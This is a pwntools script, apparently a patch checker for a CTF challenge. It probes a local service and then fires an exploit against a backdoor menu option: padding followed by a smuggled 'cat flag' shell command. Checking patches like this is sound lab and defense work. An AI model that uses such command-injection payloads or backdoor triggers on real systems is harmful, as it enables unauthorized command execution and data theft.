from pwn import *


s    = lambda x : io.send(x)
sl   = lambda x : io.sendline(x)
r    = lambda x : io.recv(x)
ru   = lambda x : io.recvuntil(x)
rl   = lambda   : io.recvline()
itr  = lambda   : io.interactive()
uu32 = lambda x : u32(x.ljust(4, b"\x00"))
uu64 = lambda x : u64(x.ljust(8, b"\x00"))
ls   = lambda x : log.success(x)
lss  = lambda x : ls("\033[1;31;40m%s -> 0x%x \033[0m" % (x, eval(x)))

binary = "./pwn"

context.arch="amd64"
context.log_level='debug'

#libc = ELF('./libc.so.6')
#libc.address = 
#rdi = next(libc.search(asm('pop rdi;ret')))
#sh  = next(libc.search(b'/bin/sh'))
#system = libc.sym['system']

import signal
import time

class TimeoutError(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutError("函数执行超时")
def check_time(func,time_sec):
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(time_sec)  # 3秒超时
    res = func()
    signal.alarm(0)
    return res


def add(data):
    io.recvuntil('>>')
    io.sendline('1')
    io.recvuntil(':')
    sl(data)
def show(idx):
    io.recvuntil('>>')
    io.sendline('2')
    io.recvuntil(':')
    sl(str(idx))
def bd(cmd=b''):
    if (cmd!=b''):
        add(cmd)
    io.recvuntil('>>')
    io.sendline('1337')

def check_server():
    pay = 'hack1'
    add(pay)
    show(0)
    data = io.recvuntil('1.add').decode()
    if ('hack1' in data):
        return
    else:
        sleep(5)


def check_bd():
    bd()
    data = io.recvuntil('1.add').decode()
    if ('flag' in data and 'pwn' in data):
        return
    else:
        sleep(5)

def exp1():
    pay = b'\x00' * 0x200 + b'cat flag\x00'
    bd(pay)
    data = io.recvuntil('1.add')
    #print(f'-1{data}2-')
    if b'flag{' in data:
        return True
    return False

def check_main():
    global io
    try:
        io = remote('127.0.0.1', 9999)
        #io = process('./pwn')
    except Exception:
        return 1 # Cannot connect to service

    try:
        check_time(check_server, 2)
    except:
        return 1 # 

    try:
        check_time(check_bd,2)
    except:
        return 1 # 

    try:
        # 如果 exp1 成功返回 True，说明依然能打通
        res = check_time(exp1, 2)
        if res:
            return 2
    except:
        # 如果 exp 抛异常或者超时，说明防住了
        pass
    
    return 0

code = check_main()
print(f'code-is-{code}')
# 确保退出码一致，供 platform_run.py 捕获
sys.exit(code)

# CHECKING...
# 0 == 防御成功
# 1 == 服务异常
# 2 == exp利用成功

